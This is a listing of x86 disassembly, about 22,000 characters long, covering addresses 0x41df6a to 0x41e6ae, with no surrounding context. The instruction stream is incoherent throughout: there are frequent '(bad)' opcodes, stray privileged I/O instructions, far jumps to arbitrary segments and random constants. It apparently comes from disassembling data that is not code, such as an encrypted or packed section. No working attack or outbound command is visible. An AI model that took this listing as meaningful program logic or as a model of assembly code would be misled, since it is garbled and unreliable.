  41df6a:	es and DWORD PTR fs:[ecx+0x44],ebx
  41df6f:	mov    esi,0x117fa450
  41df74:	adc    cl,BYTE PTR [esi]
  41df76:	xlat   BYTE PTR ds:[ebx]
  41df77:	pop    ds
  41df78:	sahf   
  41df79:	xchg   DWORD PTR ds:0x56bb3205,ebp
  41df7f:	inc    edx
  41df80:	pop    ds
  41df81:	push   eax
  41df82:	sti    
  41df83:	xchg   bl,bh
  41df85:	nop
  41df86:	dec    esi
  41df87:	push   0xfffffffc
  41df89:	dec    esp
  41df8a:	and    BYTE PTR [edx-0x702ff6ec],0xbf
  41df91:	jbe    0x41df84
  41df93:	cmp    BYTE PTR [ebx],ah
  41df95:	mov    al,ds:0x263bbd09
  41df9a:	outs   dx,BYTE PTR ds:[esi]
  41df9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df9c:	or     bh,0xcb
  41df9f:	jno    0x41e01b
  41dfa1:	stos   DWORD PTR es:[edi],eax
  41dfa2:	scas   eax,DWORD PTR es:[edi]
  41dfa3:	ss jbe 0x41df4f
  41dfa6:	clc    
  41dfa7:	and    BYTE PTR [ebx-0x5df72cdd],0x57
  41dfae:	mov    WORD PTR [esi],ss
  41dfb0:	xchg   edx,eax
  41dfb1:	xor    esp,ebp
  41dfb3:	sub    eax,0x80ce147b
  41dfb8:	mov    BYTE PTR [edi+ebp*1-0x19fcb415],ah
  41dfbf:	mov    eax,ds:0xfaca2bb5
  41dfc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc5:	mov    al,0x24
  41dfc7:	outs   dx,DWORD PTR ds:[esi]
  41dfc8:	push   0xa6689266
  41dfcd:	fbld   TBYTE PTR [ecx]
  41dfcf:	dec    edx
  41dfd0:	jle    0x41df6c
  41dfd2:	mov    ss,WORD PTR [eax+0x51]
  41dfd5:	cmp    esi,DWORD PTR [esi-0x64097cb0]
  41dfdb:	and    al,0x58
  41dfdd:	add    al,0x84
  41dfdf:	lahf   
  41dfe0:	sar    bl,0x84
  41dfe3:	(bad)  
  41dfe4:	push   esp
  41dfe5:	sub    al,0xdd
  41dfe7:	clc    
  41dfe8:	mov    ch,0x1a
  41dfea:	daa    
  41dfeb:	xor    dh,BYTE PTR [edx]
  41dfed:	ret    
  41dfee:	jno    0x41dfc5
  41dff0:	or     DWORD PTR [ebp-0x43],eax
  41dff3:	jmp    0x7c76e944
  41dff8:	sub    al,0x5b
  41dffa:	psubd  mm3,QWORD PTR [edi]
  41dffd:	xor    esi,DWORD PTR [edi]
  41dfff:	repz in al,0xf4
  41e002:	rep stos DWORD PTR es:[edi],eax
  41e004:	sub    eax,0xb86fcec3
  41e009:	out    0x33,al
  41e00b:	out    dx,eax
  41e00c:	mov    dl,0xcb
  41e00e:	or     al,0x4e
  41e010:	jo     0x41e01c
  41e012:	inc    ebx
  41e013:	fstp   QWORD PTR [edx-0x6d]
  41e016:	mov    bl,0x7f
  41e018:	jmp    0x8f5:0x5d396015
  41e01f:	add    al,0x1c
  41e021:	mov    DWORD PTR [ecx],ecx
  41e023:	jmp    0x41e055
  41e025:	adc    eax,0x28b0bd3d
  41e02a:	adc    al,0x44
  41e02c:	imul   edi,DWORD PTR [eax+eax*2-0x2e],0x65b38080
  41e034:	or     BYTE PTR [edx+0x54155952],0x2d
  41e03b:	(bad)  
  41e03c:	rcr    BYTE PTR ds:0x5c7c7745,cl
  41e042:	jle    0x41e0b5
  41e044:	push   ebx
  41e045:	aam    0x3f
  41e047:	stc    
  41e048:	pop    es
  41e049:	pusha  
  41e04a:	and    edx,DWORD PTR [edi+esi*4+0x51]
  41e04e:	popf   
  41e04f:	dec    esp
  41e050:	bound  edx,QWORD PTR [edi]
  41e052:	add    al,0xf3
  41e054:	outs   dx,DWORD PTR ds:[esi]
  41e055:	inc    DWORD PTR [ecx-0x4d]
  41e058:	imul   esi,DWORD PTR [edi-0x37],0xffffff98
  41e05c:	jge    0x41dffe
  41e05e:	in     al,dx
  41e05f:	mov    ch,0xef
  41e061:	sub    dl,BYTE PTR [ebx-0x75d23d84]
  41e067:	jns    0x41e0c4
  41e069:	xchg   esp,eax
  41e06a:	xchg   ebx,eax
  41e06b:	inc    ebx
  41e06c:	mov    edx,0xe6fcf774
  41e071:	(bad)  
  41e073:	mov    ch,0xe3
  41e075:	aad    0xf
  41e077:	mov    dl,0xed
  41e079:	jmp    0x41e08c
  41e07b:	add    al,0x8c
  41e07d:	sub    eax,0x3f48908
  41e082:	dec    esp
  41e083:	dec    edi
  41e084:	jmp    0x94feafb8
  41e089:	sub    DWORD PTR [ebx],esp
  41e08b:	mov    ah,0x9c
  41e08d:	aad    0xb1
  41e08f:	(bad)  
  41e090:	pushf  
  41e091:	dec    ecx
  41e092:	sti    
  41e093:	jl     0x41e100
  41e095:	push   ds
  41e096:	stos   DWORD PTR es:[edi],eax
  41e097:	inc    esi
  41e098:	lds    esp,FWORD PTR [eax]
  41e09a:	sbb    dl,dl
  41e09c:	pop    ecx
  41e09d:	mov    eax,0xd796e48
  41e0a2:	jmp    0x41e080
  41e0a4:	fld    TBYTE PTR [ebx-0x2c]
  41e0a7:	sti    
  41e0a8:	mov    ebp,0x849ad453
  41e0ad:	push   ds
  41e0ae:	shl    ecx,0xf9
  41e0b1:	xor    esi,edi
  41e0b3:	pop    esp
  41e0b4:	call   0xfb8d7213
  41e0b9:	inc    ebx
  41e0ba:	retf   0xb3a7
  41e0bd:	pop    ebp
  41e0be:	and    cl,bh
  41e0c0:	arpl   bp,cx
  41e0c2:	popa   
  41e0c3:	adc    esp,edi
  41e0c5:	mov    ebx,0x83101491
  41e0ca:	and    eax,0xfbe6a6e0
  41e0cf:	cmp    ebx,DWORD PTR [ebp+0xf615d01]
  41e0d5:	rcr    BYTE PTR [ebp+0x2a347f1f],cl
  41e0db:	pusha  
  41e0dc:	mov    dl,0xf2
  41e0de:	inc    edi
  41e0df:	or     ebp,ebp
  41e0e1:	add    al,0xa1
  41e0e3:	mov    edx,0x141396e8
  41e0e8:	mov    ebx,0xfee36930
  41e0ed:	or     dh,BYTE PTR [ebx-0x6e783964]
  41e0f3:	lods   al,BYTE PTR ds:[esi]
  41e0f4:	into   
  41e0f5:	xor    DWORD PTR [eax],ebp
  41e0f7:	sbb    eax,0x79b9000
  41e0fc:	adc    ebx,DWORD PTR [edx]
  41e0fe:	jge    0x41e128
  41e100:	jns    0x41e091
  41e102:	stos   DWORD PTR es:[edi],eax
  41e103:	icebp  
  41e104:	mov    ecx,0x8cb5bbb5
  41e109:	add    BYTE PTR [edi-0x5e],bl
  41e10c:	jmp    0x869d:0x3a72c035
  41e113:	or     eax,0xa70b1c5
  41e118:	(bad)  
  41e119:	ins    BYTE PTR es:[edi],dx
  41e11a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e11b:	dec    ebx
  41e11c:	xchg   ebx,ebp
  41e11e:	inc    eax
  41e11f:	adc    dl,BYTE PTR [ebp+0x77]
  41e122:	jnp    0x41e16f
  41e124:	jnp    0x41e0ae
  41e126:	jb     0x41e16c
  41e128:	ins    BYTE PTR es:[edi],dx
  41e129:	xor    DWORD PTR [esi+0x71],edi
  41e12c:	addr16 or eax,0x6db7e56f
  41e132:	add    eax,0xc4d71e62
  41e137:	mov    ebx,0x14fab6ec
  41e13c:	mov    ebx,DWORD PTR [edx+ebp*1]
  41e13f:	mov    bh,0x0
  41e141:	outs   dx,DWORD PTR ds:[esi]
  41e142:	mov    ds:0x4f8c6793,al
  41e147:	push   ecx
  41e148:	fisttp QWORD PTR [ecx]
  41e14a:	fsubp  st(3),st
  41e14c:	lods   al,BYTE PTR ds:[esi]
  41e14d:	mov    ebp,0x19dd5dd0
  41e152:	dec    ecx
  41e153:	sbb    DWORD PTR [ebx-0x27c382e6],esp
  41e159:	and    DWORD PTR [esi],edi
  41e15b:	pop    edx
  41e15c:	bound  ecx,QWORD PTR [ebx-0x2a]
  41e15f:	int    0x9f
  41e161:	sbb    eax,0xc8ac2f89
  41e166:	shl    BYTE PTR [ebp-0x714fa4f6],1
  41e16c:	imul   BYTE PTR [edx+0x0]
  41e16f:	dec    eax
  41e170:	call   0x1c99:0xf0cf1698
  41e177:	lods   al,BYTE PTR ds:[esi]
  41e178:	bswap  esi
  41e17a:	in     eax,dx
  41e17b:	pushf  
  41e17c:	jb     0x41e124
  41e17e:	mov    al,0xd7
  41e180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e181:	sbb    DWORD PTR [eax],0xc204a89c
  41e187:	loop   0x41e150
  41e189:	cmp    bl,BYTE PTR [edi]
  41e18b:	adc    al,0xd6
  41e18d:	dec    edx
  41e18e:	push   edx
  41e18f:	in     al,0xed
  41e191:	inc    ebx
  41e192:	and    esi,DWORD PTR ds:[eax]
  41e195:	and    BYTE PTR [eax-0x554595c0],ch
  41e19b:	mov    ebx,0xb4bb5a4d
  41e1a0:	aam    0xda
  41e1a2:	sub    ecx,ebp
  41e1a4:	xchg   DWORD PTR [ebp+0x2b6dc6ec],esi
  41e1aa:	dec    ebx
  41e1ab:	jl     0x41e1b9
  41e1ad:	add    eax,0xdd5a4c7c
  41e1b2:	inc    eax
  41e1b3:	push   ss
  41e1b4:	add    al,0xa1
  41e1b6:	jb     0x41e16d
  41e1b8:	xlat   BYTE PTR ds:[ebx]
  41e1b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1ba:	add    al,0x63
  41e1bc:	jo     0x41e23a
  41e1be:	cdq    
  41e1bf:	sahf   
  41e1c0:	neg    DWORD PTR [edi+0x50]
  41e1c3:	xchg   DWORD PTR [ebx+0x4122ac1c],eax
  41e1c9:	imul   esp,DWORD PTR [esi+0x64],0xffffffc2
  41e1cd:	aad    0x76
  41e1cf:	and    BYTE PTR ds:0x3928c27e,ch
  41e1d5:	or     DWORD PTR [esi+ebp*8],ebp
  41e1d8:	loope  0x41e20b
  41e1da:	hlt    
  41e1db:	clc    
  41e1dc:	data16 adc bh,BYTE PTR [edi+0x1]
  41e1e0:	mov    al,0x29
  41e1e2:	jnp    0x41e1d3
  41e1e4:	ins    DWORD PTR es:[edi],dx
  41e1e5:	pop    ebp
  41e1e6:	ins    DWORD PTR es:[edi],dx
  41e1e7:	repnz data16 mov dl,0x8c
  41e1eb:	cmp    cl,dh
  41e1ed:	xor    edi,DWORD PTR [eax+ecx*8]
  41e1f0:	enter  0x2f69,0x71
  41e1f4:	xor    BYTE PTR [ecx],0x15
  41e1f7:	pop    es
  41e1f8:	add    al,0xf1
  41e1fa:	mov    ah,0xf
  41e1fc:	popf   
  41e1fd:	sub    bl,BYTE PTR [esi+0xf4a8852]
  41e203:	jno    0x41e1c2
  41e205:	dec    eax
  41e206:	push   0x5f250191
  41e20b:	nop
  41e20c:	std    
  41e20d:	(bad)
  41e210:	call   0x363:0x5a054f1e
  41e217:	in     al,dx
  41e218:	xchg   DWORD PTR [esi+edx*4-0x639eae03],edx
  41e21f:	jmp    0x41e204
  41e221:	jl     0x41e220
  41e223:	out    0x4f,eax
  41e225:	push   cs
  41e226:	dec    edi
  41e227:	out    0xb6,eax
  41e229:	add    al,0xb4
  41e22b:	push   ebp
  41e22c:	ficomp WORD PTR [ecx-0x76]
  41e22f:	mov    edi,0x50f0fd84
  41e234:	dec    edx
  41e235:	jne    0x41e1db
  41e237:	iret   
  41e238:	jmp    0xd6eb9960
  41e23d:	push   esi
  41e23e:	jnp    0x41e20b
  41e240:	rcr    BYTE PTR [edx],1
  41e242:	fsub   DWORD PTR [esi]
  41e244:	dec    ebp
  41e245:	jo     0x41e244
  41e247:	imul   DWORD PTR [edi+0x7e]
  41e24a:	shl    bh,1
  41e24c:	adc    eax,0xfd80722d
  41e251:	inc    ebx
  41e252:	and    al,0xba
  41e254:	add    DWORD PTR [edx+0x4a],ebp
  41e257:	mov    ah,0x1a
  41e259:	daa    
  41e25a:	mov    bh,0x48
  41e25c:	sti    
  41e25d:	mov    edi,0x3516cbc0
  41e262:	xor    dl,0x2e
  41e265:	sub    eax,0x798f2621
  41e26a:	pop    edi
  41e26b:	xchg   edx,eax
  41e26c:	in     al,0x52
  41e26e:	lods   eax,DWORD PTR ds:[esi]
  41e26f:	lods   eax,DWORD PTR ds:[esi]
  41e270:	mov    ebx,0xbe7ee638
  41e275:	je     0x41e29f
  41e277:	and    edx,DWORD PTR [esi+ebx*2+0x6f5e6a0d]
  41e27e:	mov    BYTE PTR [ebp-0x7d7d12c5],bh
  41e284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e285:	imul   edx,eax,0xd62e7457
  41e28b:	and    eax,0x46482025
  41e290:	call   0x3690e53b
  41e295:	cmp    cl,cl
  41e297:	jb     0x41e245
  41e299:	jge    0x41e22e
  41e29b:	xor    edi,DWORD PTR [edi-0x61]
  41e29e:	popa   
  41e29f:	and    dh,BYTE PTR [ebx+ecx*8-0x7e]
  41e2a3:	xchg   edi,eax
  41e2a4:	rcl    edi,cl
  41e2a6:	inc    esp
  41e2a7:	stc    
  41e2a8:	add    eax,0x8b2d1ca7
  41e2ad:	jl     0x41e2ab
  41e2af:	xlat   BYTE PTR ds:[ebx]
  41e2b0:	dec    esi
  41e2b1:	into   
  41e2b2:	cmp    esi,ebp
  41e2b4:	inc    esp
  41e2b5:	(bad)  
  41e2b6:	jecxz  0x41e2d9
  41e2b8:	test   BYTE PTR [edi],al
  41e2ba:	das    
  41e2bb:	xchg   edx,eax
  41e2bc:	ret    0x4230
  41e2bf:	jbe    0x41e2c1
  41e2c1:	sbb    eax,0xbb9c7e9a
  41e2c6:	or     eax,0x9e7e0caf
  41e2cb:	pushf  
  41e2cc:	loope  0x41e34c
  41e2ce:	mov    ds:0x47904d7c,al
  41e2d3:	add    DWORD PTR [edx+0x48],esp
  41e2d6:	test   BYTE PTR [ebx+0x7415967e],cl
  41e2dc:	jl     0x41e299
  41e2de:	xchg   DWORD PTR [ebx+0x1],eax
  41e2e1:	iret   
  41e2e2:	ret    0xc4b8
  41e2e5:	push   ebx
  41e2e6:	dec    ebp
  41e2e7:	stos   BYTE PTR es:[edi],al
  41e2e8:	dec    edi
  41e2e9:	cli    
  41e2ea:	dec    esi
  41e2eb:	jnp    0x41e327
  41e2ed:	pop    edi
  41e2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ef:	and    BYTE PTR [eax],cl
  41e2f1:	or     ch,dh
  41e2f3:	sub    bl,BYTE PTR [eax+0x5f]
  41e2f6:	mov    edi,0x4aedc304
  41e2fb:	js     0x41e33f
  41e2fd:	push   ds
  41e2fe:	das    
  41e2ff:	xor    DWORD PTR [edi],ecx
  41e301:	fisub  WORD PTR [esi]
  41e303:	cs in  eax,0x78
  41e306:	adc    DWORD PTR [esi+ebx*2+0x7efd7701],eax
  41e30d:	or     al,0x25
  41e30f:	mov    al,0xe0
  41e311:	cmp    ebx,edx
  41e313:	xchg   edx,eax
  41e314:	cmc    
  41e315:	in     eax,0x88
  41e317:	lea    edi,[edx+edi*1-0x59]
  41e31b:	sahf   
  41e31c:	xchg   ecx,eax
  41e31d:	retf   0x2ca9
  41e320:	rcl    BYTE PTR ds:0x83358cfa,1
  41e326:	xchg   edx,eax
  41e327:	adc    cl,BYTE PTR [eax]
  41e329:	xor    al,0xfc
  41e32b:	fbstp  TBYTE PTR ds:0x30dacc2
  41e331:	xchg   ebp,ebx
  41e333:	jmp    0x16f8:0xb2db3203
  41e33a:	ins    DWORD PTR es:[edi],dx
  41e33b:	mov    dl,0x77
  41e33d:	hlt    
  41e33e:	gs xor al,0xb5
  41e341:	cmp    DWORD PTR [edi],esi
  41e343:	in     eax,0x49
  41e345:	push   edi
  41e346:	(bad)  
  41e347:	test   eax,0xb569e27f
  41e34c:	out    dx,eax
  41e34d:	ds xchg ebp,eax
  41e34f:	adc    DWORD PTR [edx+0x2a8853cb],eax
  41e355:	xlat   BYTE PTR ds:[ebx]
  41e356:	out    dx,al
  41e357:	dec    edi
  41e358:	mov    ah,0x8b
  41e35a:	push   esp
  41e35b:	sub    BYTE PTR [edi],al
  41e35d:	mov    ah,0x97
  41e35f:	test   eax,0xeef48abc
  41e364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e365:	xchg   ebx,eax
  41e366:	push   cs
  41e367:	lock test BYTE PTR [eax-0x26],cl
  41e36b:	ja     0x41e346
  41e36d:	mov    bh,0xdb
  41e36f:	xor    eax,0x74d63cb6
  41e374:	sbb    al,0x5a
  41e376:	call   0x727d5c84
  41e37b:	es (bad) 
  41e37d:	loope  0x41e35d
  41e37f:	inc    eax
  41e380:	cmp    ecx,DWORD PTR [ebx-0xb]
  41e383:	iret   
  41e384:	add    cl,bl
  41e386:	sbb    DWORD PTR [ebx-0x63],0x576d60b0
  41e38d:	push   0x38
  41e38f:	dec    ecx
  41e390:	nop
  41e391:	xor    edi,DWORD PTR [ecx+ebx*4-0x38]
  41e395:	mov    BYTE PTR [eax+0x64],dh
  41e398:	sub    eax,ecx
  41e39a:	adc    DWORD PTR [ecx],esi
  41e39c:	mov    dl,0xeb
  41e39e:	fwait
  41e39f:	push   ecx
  41e3a0:	mov    BYTE PTR [edi-0x1],al
  41e3a3:	ins    BYTE PTR es:[edi],dx
  41e3a4:	test   BYTE PTR [ecx+0x4e],al
  41e3a7:	or     DWORD PTR [ebx+0x6f],edi
  41e3aa:	inc    ebp
  41e3ab:	or     ebp,edi
  41e3ad:	into   
  41e3ae:	sbb    BYTE PTR [ebx],ch
  41e3b0:	popa   
  41e3b1:	in     eax,0xf5
  41e3b3:	gs daa 
  41e3b5:	stos   DWORD PTR es:[edi],eax
  41e3b6:	lods   al,BYTE PTR ds:[esi]
  41e3b7:	bound  esp,QWORD PTR [ebx+0x23]
  41e3ba:	inc    ebp
  41e3bb:	jp     0x41e3d4
  41e3bd:	cmp    eax,esp
  41e3bf:	ins    DWORD PTR es:[edi],dx
  41e3c0:	clc    
  41e3c1:	ja     0x41e40d
  41e3c3:	aad    0x8e
  41e3c5:	out    0x9e,eax
  41e3c7:	sbb    DWORD PTR [ebp-0x24],esp
  41e3ca:	cs adc eax,edi
  41e3cd:	pop    eax
  41e3ce:	or     ebp,DWORD PTR [ebp-0x22b64a37]
  41e3d4:	jg     0x41e371
  41e3d6:	jns    0x41e3b7
  41e3d8:	inc    ebp
  41e3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3da:	ficom  DWORD PTR [ecx+0x7a978b92]
  41e3e0:	cmc    
  41e3e1:	fsubr  QWORD PTR [esi-0x68]
  41e3e4:	int    0xad
  41e3e6:	dec    ebx
  41e3e7:	adc    DWORD PTR [eax+ebx*2],0x66a2ac4c
  41e3ee:	inc    ebx
  41e3ef:	lea    edx,[ecx+eiz*2]
  41e3f2:	and    eax,0x73a3164a
  41e3f7:	fwait
  41e3f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3f9:	push   esi
  41e3fa:	aas    
  41e3fb:	inc    esp
  41e3fc:	retf   0x30bc
  41e3ff:	jo     0x41e3b0
  41e401:	enter  0x8406,0xff
  41e405:	and    eax,0xeed49df
  41e40a:	outs   dx,DWORD PTR ds:[esi]
  41e40b:	and    al,BYTE PTR [ecx+0x7c1495a2]
  41e411:	jmp    0xa0cda2b6
  41e416:	jle    0x41e3b7
  41e418:	scas   eax,DWORD PTR es:[edi]
  41e419:	lea    eax,[edi+0x1d]
  41e41c:	fld    TBYTE PTR [ebx+ebx*4-0x3085dd1c]
  41e423:	ss jg  0x41e3b2
  41e426:	mov    bl,BYTE PTR [ebp+0x68b2cdfb]
  41e42c:	push   es
  41e42d:	cmp    bx,WORD PTR [ebx]
  41e430:	or     DWORD PTR ds:0x8648544f,edx
  41e436:	xor    al,0x3d
  41e438:	or     BYTE PTR ds:0x3271a1df,dl
  41e43e:	pushf  
  41e43f:	push   ss
  41e440:	jb     0x41e3d8
  41e442:	in     eax,dx
  41e443:	(bad)
  41e446:	enter  0x2214,0x46
  41e44a:	daa    
  41e44b:	mov    ch,0x6e
  41e44d:	pusha  
  41e44e:	shl    BYTE PTR [edi-0x7bc6423f],1
  41e454:	or     dh,BYTE PTR [ebp+0x71708a39]
  41e45a:	lods   al,BYTE PTR ds:[esi]
  41e45b:	aas    
  41e45c:	mov    ebp,DWORD PTR [edi+0x4f0cc667]
  41e462:	les    esi,FWORD PTR [ebp+ecx*2+0x5d]
  41e466:	in     al,dx
  41e467:	or     ecx,DWORD PTR [ecx+ebp*8]
  41e46a:	sub    eax,0x4f6058fe
  41e46f:	ds jmp 0xa5c2:0x388062fa
  41e477:	je     0x41e4bf
  41e479:	ror    BYTE PTR [ebx],cl
  41e47b:	(bad)  
  41e47d:	aaa    
  41e47e:	arpl   WORD PTR [ebx],di
  41e480:	cmp    al,BYTE PTR [ebx-0x23e2c403]
  41e486:	mov    ebp,0xe82d10c3
  41e48b:	or     al,0x3a
  41e48d:	push   cs
  41e48e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e48f:	inc    edx
  41e490:	ins    DWORD PTR es:[edi],dx
  41e491:	retf   0xb663
  41e494:	mov    esp,0x3a7f36bd
  41e499:	cmp    al,0x90
  41e49b:	xchg   esi,eax
  41e49c:	xlat   BYTE PTR ds:[ebx]
  41e49d:	add    ebp,esi
  41e49f:	jno    0x41e4b2
  41e4a1:	repz call 0x2f237c2c
  41e4a7:	pop    ecx
  41e4a8:	cmp    ah,ch
  41e4aa:	dec    ebx
  41e4ab:	test   al,0x69
  41e4ad:	dec    ecx
  41e4ae:	dec    esi
  41e4af:	and    DWORD PTR [ebx],ebp
  41e4b1:	pop    ebx
  41e4b2:	outs   dx,DWORD PTR ds:[esi]
  41e4b3:	bound  ebp,QWORD PTR [edx]
  41e4b5:	fadd   QWORD PTR [ebp-0x44]
  41e4b8:	jbe    0x41e48e
  41e4ba:	(bad)  
  41e4bb:	loopne 0x41e4c2
  41e4bd:	xchg   ebp,eax
  41e4be:	cdq    
  41e4bf:	(bad)  
  41e4c0:	loopne 0x41e483
  41e4c2:	or     edi,DWORD PTR [ebp+0x157d1de8]
  41e4c8:	call   0x10a8e151
  41e4cd:	stc    
  41e4ce:	xor    ecx,esi
  41e4d0:	and    ah,bh
  41e4d2:	mov    esp,gs
  41e4d4:	mov    cs,WORD PTR [eax+eax*1-0x5e]
  41e4d8:	adc    al,0x9e
  41e4da:	sub    eax,0x5530fa88
  41e4df:	mov    ds:0xcbc7c01e,eax
  41e4e5:	sub    esi,DWORD PTR [ecx+0x152373cc]
  41e4eb:	jp     0x41e4b5
  41e4ed:	stos   BYTE PTR es:[edi],al
  41e4ee:	int3   
  41e4ef:	loopne 0x41e531
  41e4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4f2:	xchg   esp,esp
  41e4f4:	fisttp DWORD PTR [ebp+0x12]
  41e4f8:	es pop es
  41e4fa:	les    esp,FWORD PTR [ebx+0x2795a0e0]
  41e500:	scas   al,BYTE PTR es:[edi]
  41e501:	mov    dl,0xdc
  41e503:	xchg   esi,eax
  41e504:	jmp    0x41e4ba
  41e506:	(bad)  
  41e507:	inc    esi
  41e508:	or     BYTE PTR [edx],bl
  41e50a:	shr    edx,cl
  41e50c:	mov    ?,WORD PTR [ebx]
  41e50e:	js     0x41e4e4
  41e510:	sub    eax,0xf82da684
  41e515:	jnp    0x41e581
  41e517:	inc    edi
  41e518:	outs   dx,BYTE PTR ds:[esi]
  41e519:	cmp    bl,BYTE PTR [esi]
  41e51b:	or     edx,edx
  41e51d:	outs   dx,BYTE PTR ds:[esi]
  41e51e:	mov    BYTE PTR [ecx+eiz*4],cl
  41e521:	xchg   esi,eax
  41e522:	jecxz  0x41e505
  41e524:	adc    DWORD PTR [edx],eax
  41e526:	jmp    0xc4928014
  41e52b:	pop    ss
  41e52c:	mov    ebp,0xa03b27ca
  41e531:	adc    DWORD PTR [eax+0x568aaa22],esi
  41e537:	popa   
  41e538:	pop    ecx
  41e539:	cmc    
  41e53a:	in     eax,0xff
  41e53c:	mov    bh,BYTE PTR [ebx]
  41e53e:	mov    dh,0xb7
  41e540:	jmp    0x41e594
  41e542:	jecxz  0x41e51d
  41e544:	in     eax,0xa
  41e546:	aas    
  41e547:	dec    edx
  41e548:	dec    ebp
  41e549:	pop    eax
  41e54a:	cmp    dh,bh
  41e54c:	push   edx
  41e54d:	aam    0xd2
  41e54f:	xor    al,BYTE PTR [ecx-0x35a1fe01]
  41e555:	add    al,0xf2
  41e557:	push   ds
  41e558:	push   edi
  41e559:	js     0x41e524
  41e55b:	add    BYTE PTR [eax+0x7a473398],ch
  41e561:	mov    BYTE PTR [ecx-0x51],dl
  41e564:	push   0x2a
  41e566:	(bad)  
  41e568:	neg    BYTE PTR [ecx]
  41e56a:	fadd   st,st(4)
  41e56c:	aad    0x93
  41e56e:	std    
  41e56f:	imul   ecx,DWORD PTR [eax+0x7c],0x8a5f3b98
  41e576:	xchg   DWORD PTR [ebp+0x40],eax
  41e579:	fs cli 
  41e57b:	pop    edx
  41e57c:	adc    eax,esi
  41e57e:	sti    
  41e57f:	push   edx
  41e580:	shr    bl,cl
  41e582:	(bad)  
  41e583:	popf   
  41e584:	jl     0x41e531
  41e586:	ret    
  41e587:	pop    edi
  41e588:	out    0xe5,al
  41e58a:	outs   dx,DWORD PTR ds:[esi]
  41e58b:	xchg   ebp,eax
  41e58c:	mov    ebx,0x50775007
  41e591:	ins    BYTE PTR es:[edi],dx
  41e592:	jp     0x41e611
  41e594:	loope  0x41e548
  41e596:	mov    edi,0xcd058d23
  41e59b:	js     0x41e548
  41e59d:	out    dx,al
  41e59e:	xor    eax,0xf055d093
  41e5a3:	xchg   edx,eax
  41e5a4:	cld    
  41e5a5:	xchg   esi,eax
  41e5a6:	sahf   
  41e5a7:	imul   edx,DWORD PTR [edi],0xd0c0c427
  41e5ad:	stos   BYTE PTR es:[edi],al
  41e5ae:	punpckhbw mm6,mm0
  41e5b1:	cmc    
  41e5b2:	pop    esp
  41e5b3:	mov    eax,ecx
  41e5b5:	push   edi
  41e5b6:	dec    edx
  41e5b7:	stos   DWORD PTR es:[edi],eax
  41e5b8:	f2xm1  
  41e5ba:	cmp    eax,0x3f266e54
  41e5bf:	jo     0x41e5c9
  41e5c1:	xor    eax,0xd6ba0f86
  41e5c6:	(bad)  
  41e5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5c9:	enter  0x6bc0,0x20
  41e5cd:	in     al,dx
  41e5ce:	inc    edi
  41e5cf:	ret    0x9a22
  41e5d2:	pop    esi
  41e5d3:	or     edi,edi
  41e5d5:	dec    ecx
  41e5d6:	mov    eax,0xee96ea58
  41e5db:	adc    al,dh
  41e5dd:	sub    ebp,DWORD PTR ds:0x33e7dd49
  41e5e3:	call   0xa410:0x79760945
  41e5ea:	in     al,dx
  41e5eb:	stos   BYTE PTR es:[edi],al
  41e5ec:	pusha  
  41e5ed:	jne    0x41e64a
  41e5ef:	xchg   edi,eax
  41e5f0:	mov    dl,0xf3
  41e5f2:	push   0xffffffec
  41e5f4:	mov    dh,0x24
  41e5f6:	push   es
  41e5f7:	enter  0x87,0xb6
  41e5fb:	rol    BYTE PTR [eax-0x6a],1
  41e5fe:	jbe    0x41e636
  41e600:	mov    esi,0xf0fb55f1
  41e605:	xor    al,BYTE PTR [eax]
  41e607:	jecxz  0x41e5c0
  41e609:	dec    esi
  41e60a:	mov    eax,0x90804819
  41e60f:	cmp    al,0x6
  41e611:	fcmovbe st,st(1)
  41e613:	jns    0x41e64d
  41e615:	sub    ecx,DWORD PTR [eax-0x1afba53f]
  41e61b:	sub    eax,0xb6956996
  41e620:	push   edx
  41e621:	xchg   BYTE PTR [edx+esi*8+0x6365672c],al
  41e628:	clc    
  41e629:	inc    DWORD PTR [ecx+0x48]
  41e62c:	xchg   edx,eax
  41e62e:	mov    ds:0x5f9d78d8,al
  41e633:	xor    esi,DWORD PTR [ecx+0x68]
  41e636:	in     eax,0x8c
  41e638:	(bad)  
  41e639:	push   ebx
  41e63a:	sub    BYTE PTR [esi+ebp*1],0xfa
  41e63e:	call   0xf617:0xcc54c326
  41e645:	mov    eax,0x9188c7b6
  41e64a:	fdivr  QWORD PTR [esi-0x5c]
  41e64d:	and    BYTE PTR [edx-0x50872878],bl
  41e653:	adc    esi,ebp
  41e655:	inc    esi
  41e656:	ret    0xd79e
  41e659:	jns    0x41e628
  41e65b:	stos   DWORD PTR es:[edi],eax
  41e65c:	xchg   ah,ah
  41e65e:	add    ah,cl
  41e660:	pushf  
  41e661:	outs   dx,BYTE PTR ds:[esi]
  41e662:	push   0xfffffff1
  41e664:	jge    0x41e5ea
  41e666:	div    DWORD PTR [esi+0x3c]
  41e669:	adc    bl,ch
  41e66b:	je     0x41e670
  41e66d:	(bad)  
  41e66e:	or     BYTE PTR [esi+0xeef1d4b],ch
  41e674:	jae    0x41e6a7
  41e676:	dec    cx
  41e678:	jno    0x41e630
  41e67a:	inc    ecx
  41e67b:	inc    esi
  41e67c:	mov    esp,0x76cc6b4a
  41e681:	sub    DWORD PTR [edi-0x4f84176c],edx
  41e687:	dec    ecx
  41e688:	push   ss
  41e689:	inc    ebx
  41e68a:	hlt    
  41e68b:	lahf   
  41e68c:	dec    esi
  41e68d:	xchg   esi,eax
  41e68e:	pusha  
  41e68f:	hlt    
  41e690:	aam    0x5f
  41e692:	js     0x41e68c
  41e694:	adc    eax,0x174fcb21
  41e699:	cmp    ch,BYTE PTR [ebp+0x54]
  41e69c:	sub    BYTE PTR [ebp+ecx*2+0x17ef8248],ah
  41e6a3:	xor    eax,DWORD PTR [eax+0x3737fa22]
  41e6a9:	mov    al,ds:0xc169fc1a
  41e6ae:	push   esi
